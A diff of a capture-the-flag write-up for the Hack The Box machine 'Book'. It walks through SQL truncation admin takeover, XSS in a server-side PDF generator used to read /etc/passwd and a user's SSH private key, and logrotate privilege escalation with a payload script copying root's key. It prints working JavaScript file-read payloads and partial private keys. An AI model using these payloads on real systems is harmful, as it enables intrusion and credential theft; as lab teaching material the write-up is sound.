@@ -81,13 +81,15 @@ Unfortunately, I did not currently have any valid usernames to do this attack ag
 
 ![](../.gitbook/assets/3-loggedin.png)
 
+Since I had decided I was looking for a username and/or email address I thought that the most likely place to find those would be on the Contact page. 
+
 ![](../.gitbook/assets/screenshot_2020-06-07_10-46-22.png)
 
-I found what I was looking for on the `Contact us` page.  The email address `admin@book.htb` was most likely the email address for logging into the Admin account.   
+My hunch was correct, and I found what I was looking for on the `Contact us` page.  The email address `admin@book.htb` seemed likely to be the email address for logging into the Admin account.   
 
 ![](../.gitbook/assets/6-admin-fail.png)
 
-I first tried some basic passwords to log in, but just got this message.
+Before going through contortions to execute some sort of exploit I first tried some basic passwords to log in, but just got this message each time.
 
 ![](../.gitbook/assets/7-nope.png)
 
@@ -101,7 +103,7 @@ Trying to \(re\)create the admin account without using SQL truncate results in t
 
 ![](../.gitbook/assets/9-admin-exists.png)
 
-Next I tried doing the attack by putting a lot of spaces and a the word 'test' after the email address so that it was well past the 20 character maximum.  
+This was to be expected.  Next I tried doing the attack by putting a lot of spaces and a the word 'test' after the email address so that it was well past the 20 character maximum.  
 
 ![](../.gitbook/assets/10-new-admin-deny.png)
 
@@ -133,7 +135,7 @@ Thinking that my password choice had perhaps been a bit too weak, I went back an
 
 ![](../.gitbook/assets/11.5-signedin-admin.png)
 
-I then logged in using my shiny new admin password, and started looking around.  Nothing seemed to be different other than the account I was logged in as.  
+I then logged in using my shiny new admin password, and started looking around.  Nothing seemed to be different in this account other than the username I was logged in as.  
 
 ![](../.gitbook/assets/12-submission.png)
 
@@ -211,11 +213,11 @@ Thankfully, the Administrator panel had some new options.
 
 ![](../.gitbook/assets/screenshot_2020-06-07_12-05-10.png)
 
-
+Downloading the Collections PDF showed me something interesting.  While l was playing around in the regular account I had done a test upload with the Book Title and Author fields as "a".  
 
 ![](../.gitbook/assets/screenshot_2020-07-11_10-13-35.png)
 
-You can see that the author and book name is reflecting in the pdf, in what looks like a standard html table.  This seems like it could be the code reflection vulnerability I was looking for.  Hopefully there was a way to get it to execute as well.  I also downloaded the users collection to see if there was anything useful, but just got a good laugh instead.
+My book was listed in the collection!  You can see that the author and book name is reflecting in the pdf, in what looks like a standard html table.  This seems like it could be the code reflection vulnerability I was looking for.  Hopefully there was a way to get it to execute as well.  _\(The number next to my book seems to be random, and was a link to download exactly whatever I had uploaded with a name of the random number, probably to reduce the possibility of additional code execution vectors.\)_  I also downloaded the users collection to see if there was anything useful, but just got a good laugh instead.
 
 ![](../.gitbook/assets/17-user-brute.png)
 
@@ -229,33 +231,39 @@ Since I had seen the name and title I had assigned my book submission in the pdf
 
 I captured this POST in Burp and once again sent it to Repeater.  Sending this resulted in the same pdf collection as before, with a random number next to the the word 'test'.  Next, I changed the Book Title field to contain a simple XSS attack with `<img src=x onerror=document.write('test')>`. 
 
+![](../.gitbook/assets/20-testing.png)
+
+_In case you were wondering, `51091.pdf` is just one of the randomly named files that I had gotten back from downloading the Collections PDF.  The file you upload doesn't seem to have any bearing on this vulnerability_.
+
 ![](../.gitbook/assets/20-test.png)
 
 This time only the word 'test' was written to the pdf!  The XSS vulnerability was confirmed.
 
 ### Local File Inclusion \(LFI\) through XSS - Cross Site Scripting
 
-the pdf that is uploaded to the site can be downloaded through the admin portal, but the pdf output the admin portal collections page makes is dynamically projected html. This can be exploited to xss ^ with javascript. Code execution! lets try to get `/etc/passwd` now. I used burp to make sending the request easier each time.
+the pdf that is uploaded to the site can be downloaded through the link in the Collections PDF, but the pdf output the admin portal collections page makes is dynamically projected HTML placed into a table. This can be exploited with javascript to do XSS. I decided the next thing I needed to do was to try to get a list of  usernames by downloading`/etc/passwd`.  My next request contained the following JavaScript in the title field:
 
 ```text
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
 ```
 
+![](../.gitbook/assets/21-pdf-upload.png)
+
 ![](../.gitbook/assets/23-etc-passwd.png)
 
-LFI vulnerability confirmed. Only reader and root can login. user 'reader' was identified through getting the /etc/passwd file, then need to see if he has ssh key file since port 22 is open, and I have not found any passwords anywhere
+Now I had not only used an XSS vulnerability, but also a LFI vulnerability was also confirmed. From this output I could see that there were only two users who could log in: `reader` and `root`.  
 
 ### Finding user creds
+
+Through all of my enumeration I was not able to find any passwords, so I decided to try and see if I could use the LFI vulnerability to determine if `reader` had an SSH key file I could download since port 22 was open.  I modified the example code from the blog post to blindly try to download the most common location and name for a user's SSH key file.  
 
 ```text
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
 ```
 
-
-
 ![](../.gitbook/assets/screenshot_2020-07-11_10-14-44.png)
 
-had to open pdf in firefox then ctrl-a, ctrl-c, otherwise text is truncated in default pdf reader
+My blind LFI attack was a success! However, copying all of the text from this PDF resulted in output that looked a bit strange, and didn't work for logging in.  Looking at the right edge of the output, I noticed that the text was cut off for some reason.  Hoping it was a rendering issue and not something more difficult to troubleshoot, I opened the file in another program.  
 
 ```text
 -----BEGIN RSA PRIVATE KEY-----
@@ -287,10 +295,12 @@ nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
 -----END RSA PRIVATE KEY-----
 ```
 
-remember to chmod 600 id\_rsa before use
+Opening the PDF file in Firefox resulted in the same view, but when I used `ctrl-a`, `ctrl-c` to copy all of the text I was able to copy everything.  For some reason the text was being truncated on the side, and in the default Kali pdf reader it was inaccessible.  Opening it in a browser allowed the HTML embedded in the PDF file to be copied, which in this case included the whole SSH key.  
+
+Also, as always remember to run `chmod 600 <key_file>` before using SSH keys to log in.
 
 ```text
-zweilos@kalimaa:~/htb/book$ ssh -i id_rsa reader@10.10.10.176
+zweilos@kalimaa:~/htb/book$ ssh -i reader.id_rsa reader@10.10.10.176
                     
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)
 
@@ -324,7 +334,7 @@ reader@book:~$
 
 ### User.txt
 
-
+First thing to do after logging in...collect my proof!
 
 ```text
 reader@book:~$ cat user.txt 
@@ -333,9 +343,9 @@ reader@book:~$ cat user.txt
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User
+### Enumeration as User `reader`
 
-linpeas.sh
+After checking sudo permissions with `sudo -l` \(nothing for this user sadly\) the next thing I do while enumerating Linux machines is try to run `linpeas.sh`.  This script automates a lot of the standard enumeration, and also has a nice and easy to read output.  It also has an additional benefit that came in handy for this machine.
 
 ```text
 [+] Modified interesting files in the last 5mins
@@ -351,16 +361,26 @@ linpeas.sh
 /var/log/wtmp
 /home/reader/.gnupg/trustdb.gpg
 /home/reader/.gnupg/pubring.kbx
+```
 
+### Logrotate exploitation \(logrotten\)
+
+The `linpeas.sh` script also includes links to a blog with writeups on a lot of different vulnerabilities.  The links are included in relevant sections of the output that shows files that relate to each vulnerability or exploit.  It looked like I might not have to do much searching to find a vulnerability this time, as one of the sections showed a lot of log files along with a link to an interesting privilege escalation route related to `logrotate`.
+
+```text
 [+] Writable log files (logrotten)
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                 
 Writable: /home/reader/backups/access.log.1                                                            
 Writable: /home/reader/backups/access.log
 ```
 
-## Logrotate exploitation \(logrotten\)
+The `linpeas.sh` script also told me that there were writable log files in `reader`'s home directory, and that this could potentially by exploited through the `logrotate` service. Checking out the provided link gave me the following helpful information:
 
-Looks like I might not have to do much searching to find a vulnerability. I then read the blog post about logrotate-exploitation
+> There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location. If logrotate is being executed by root, then the user will be able to write any file in `/etc/bash_completion.d/` that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder, you can privesc \(on most linux distributions, logrotate is executed automatically once a day as user root\). Also, check if apart of `/var/log` there are more files being rotated. More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition). You can exploit this vulnerability with [logrotten](https://github.com/whotwagner/logrotten).
+
+Reading the `logrotten` documentation, I found that I needed to do a bit more enumeration first to determine if I met all of the prerequisites.  
+
+### Further enumeration as `reader`
 
 ```text
 [+] Files inside /home/reader (limit 20)
@@ -374,7 +394,6 @@ lrwxrwxrwx 1 reader reader       9 Nov 29  2019 .bash_history -> /dev/null
 drwx------ 2 reader reader    4096 Nov 19  2019 .cache
 drwx------ 3 reader reader    4096 Jun  7 17:47 .gnupg
 drwxrwxr-x 3 reader reader    4096 Nov 20  2019 .local
--rwxrwxr-x 1 reader reader   34316 Jan 29 08:28 lse.sh
 -rw-r--r-- 1 reader reader     807 Apr  4  2018 .profile
 -rwxrwxr-x 1 reader reader 3078592 Aug 22  2019 pspy64
 drwx------ 2 reader reader    4096 Nov 28  2019 .ssh
@@ -393,44 +412,7 @@ root     120192  0.0  0.3 107984  7140 ?        Ss   01:33   0:00 sshd: root@pts
 
 `2020/06/07 17:08:30 CMD: UID=0 PID=16773 | /usr/sbin/logrotate -f /root/log.cfg`
 
-So the system was indeed running logrotate. Time to test out this exploit to see if I could escalate privileges to root.
-
-### Getting a shell
-
-```text
-[+] Writable log files (logrotten)
-[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                 
-Writable: /home/reader/backups/access.log.1                                                            
-Writable: /home/reader/backups/access.log
-```
-
-linpeas.sh also told me that there were writable log files in `reader`'s home directory, and that this could potentially by exploited through the logrotate service. Checking out the provided link gave me the following helpful information:
-
-> There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location. If logrotate is being executed by root, then the user will be able to write any file in `/etc/bash_completion.d/` that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder, you can privesc \(on most linux distributions, logrotate is executed automatically once a day as user root\). Also, check if apart of `/var/log` there are more files being rotated. More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition). You can exploit this vulnerability with [logrotten](https://github.com/whotwagner/logrotten).
-
-From the exploit writer at [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten):
-
-> #### Precondition for privilege escalation
->
-> * [x] Logrotate has to be executed as root
-> * [x] The logpath needs to be in control of the attacker
-> * [x] Any option that creates files is set in the logrotate configuration
->
-> #### To run the exploit:
->
-> If "create"-option is set in logrotate.cfg:
->
-> ```text
-> ./logrotten -p ./payloadfile /tmp/log/pwnme.log
-> ```
->
-> If "compress"-option is set in logrotate.cfg:
->
-> ```text
-> ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
-> ```
-
-Inside `/etc/logrotate.conf` I found that the "create" option had been set
+So the system was indeed running `logrotate`. Time to test out this exploit to see if I could escalate privileges to root.
 
 ```text
 # see "man logrotate" for details
@@ -455,7 +437,41 @@ include /etc/logrotate.d
 
 ```
 
-Based on my enumeration I found that all of the conditions for vulnerability to this exploit were met, except for one thing.  I could not find any configuration files related to `logrotate` that mentioned `access.log` in the `/home/reader/backups` folder.  I decided to go ahead  and try it anyway since it looked like a likely approach.  I created a payload that would get me root access, and ran the exploit.
+Inside `/etc/logrotate.conf` I found that the "create" option had been set
+
+### Getting a root shell
+
+From the exploit writer at [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten):
+
+> #### Precondition for privilege escalation
+>
+> * [x] Logrotate has to be executed as root
+> * [x] The logpath needs to be in control of the attacker
+> * [x] Any option that creates files is set in the logrotate configuration
+>
+> #### To run the exploit:
+>
+> If "create"-option is set in logrotate.cfg:
+>
+> ```text
+> ./logrotten -p ./payloadfile /tmp/log/pwnme.log
+> ```
+>
+> If "compress"-option is set in logrotate.cfg:
+>
+> ```text
+> ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
+> ```
+
+Based on my enumeration I found that all of the conditions for vulnerability to this exploit were met, except for one thing.  I could not find any configuration files related to `logrotate` that mentioned `access.log` in the `/home/reader/backups` folder.  I decided to go ahead and try it anyway since it still looked like a likely approach.  I created a payload that would get me root access, and ran the exploit.
+
+```text
+#!/bin/bash
+/bin/cat /root/root.txt > /dev/shm/test
+/bin/cat /root/.ssh/id_rsa > /dev/shm/test2
+```
+
+My payload was designed to exfiltrate both `root.txt` and `root`'s SSH key.
 
 ```text
 reader@book:/dev/shm$ ./logrotten -p ./payload /home/reader/backups/access.log
@@ -463,14 +479,6 @@ Waiting for rotating /home/reader/backups/access.log...
 Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
 Waiting 1 seconds before writing payload...
 Done!
-```
-
-My payload was designed to exfiltrate both `root.txt` and `root`'s SSH key.
-
-```text
-#!/bin/bash
-/bin/cat /root/root.txt > /dev/shm/test
-/bin/cat /root/.ssh/id_rsa > /dev/shm/test2
 ```
 
 However, just running the exploit was not enough.  In order to execute my script, I had to force log rotation by writing to the log a valid entry.  I simply copied the valid entry from the backup in the same folder:
@@ -523,7 +531,7 @@ yiu6RurPM+vUkQKb1omS+VqPH+Q7FiO+qeywqxSBotnLvVAiaOywUQ==
 -----END RSA PRIVATE KEY-----
 ```
 
-As always, remember to `chmod 600` your private SSH key files!
+As always, remember to `chmod 600` your private SSH key files! _\(Yes I say this a lot. It's also easy to forget for some reason...\)_
 
 ```text
 zweilos@kalimaa:~/htb/book$ chmod 600 root.id_rsa 
